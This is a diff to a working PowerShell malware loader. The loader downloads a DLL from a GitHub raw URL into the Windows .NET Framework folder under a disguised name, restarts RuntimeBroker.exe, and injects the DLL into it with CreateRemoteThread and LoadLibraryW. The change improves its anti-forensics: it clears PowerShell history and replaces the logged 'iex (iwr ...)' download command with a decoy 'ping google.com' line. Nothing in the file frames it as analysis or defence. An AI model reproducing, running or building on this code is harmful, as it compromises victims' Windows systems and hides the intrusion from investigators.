@@ -1,4 +1,19 @@
-$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";New-Item -ItemType Directory -Force -Path (Split-Path $h) | Out-Null;if(Test-Path $h){$c=@(Get-Content $h -ErrorAction SilentlyContinue);$n=$c|?{$_ -ne 'iex (iwr "https://raw.githubusercontent.com/reggiewilliamson128-code/Main/refs/heads/main/.ps1").Content'};if($c.Count -ne $n.Count){$n|Set-Content $h}}
+try{[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}catch{}
+$h="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+New-Item -ItemType Directory -Force -Path (Split-Path $h) | Out-Null
+if(Test-Path $h){
+    $c=@(Get-Content $h -ErrorAction SilentlyContinue)
+    $n=$c | ForEach-Object {
+        if($_ -eq 'iex (iwr "https://raw.githubusercontent.com/reggiewilliamson128-code/Main/refs/heads/main/.ps1").Content'){
+            'ping google.com'
+        } else {
+            $_
+        }
+    }
+    if($c -ne $n){
+        $n | Set-Content $h -ErrorAction SilentlyContinue
+    }
+}
 $p="$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll";$n='RuntimeBroker';$x="$env:SystemRoot\System32\$n.exe";$r=@(Get-Process -Name $n -ErrorAction SilentlyContinue);$inj=$false;if($r.Count -gt 0){try{if($r[0].Modules|?{$_.FileName -eq $p}){$inj=$true;Stop-Process -Name $n -Force;Start-Sleep 2}}catch{}};New-Item -ItemType Directory -Force -Path (Split-Path $p) | Out-Null;iwr "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $p -ErrorAction Stop;Add-Type -TypeDefinition @'
 using System;using System.Runtime.InteropServices;
 public class I{[DllImport("kernel32")]static extern IntPtr OpenProcess(uint a,bool b,int c);
@@ -18,4 +33,4 @@ IntPtr k=GetModuleHandle("kernel32.dll");IntPtr l=GetProcAddress(k,"LoadLibraryW
 IntPtr t=CreateRemoteThread(h,IntPtr.Zero,0,l,a,0,IntPtr.Zero);
 if(t==IntPtr.Zero){CloseHandle(h);return false;}
 WaitForSingleObject(t,0xFFFFFFFF);CloseHandle(t);CloseHandle(h);return true;}}
-'@ -ReferencedAssemblies System.Runtime.InteropServices;if($inj){Start-Process $x;Start-Sleep 2;$r=@(Get-Process -Name $n -ErrorAction SilentlyContinue);if($r.Count -gt 0){[I]::X($r[0].Id,$p)}}else{if($r.Count -eq 0){Start-Process $x;Start-Sleep 2;$r=@(Get-Process -Name $n -ErrorAction SilentlyContinue)}if($r.Count -gt 0){[I]::X($r[0].Id,$p)}}
+'@ -ReferencedAssemblies System.Runtime.InteropServices;if($inj){Start-Process $x;Start-Sleep 2;$r=@(Get-Process -Name $n -ErrorAction SilentlyContinue);if($r.Count -gt 0){$result=[I]::X($r[0].Id,$p);if($result){Write-Host "Injected"}else{Write-Host "unable to inject";exit}}else{Write-Host "unable to inject";exit}}else{if($r.Count -eq 0){Start-Process $x;Start-Sleep 2;$r=@(Get-Process -Name $n -ErrorAction SilentlyContinue)}if($r.Count -gt 0){$result=[I]::X($r[0].Id,$p);if($result){Write-Host "Injected"}else{Write-Host "unable to inject";exit}}else{Write-Host "unable to inject";exit}}
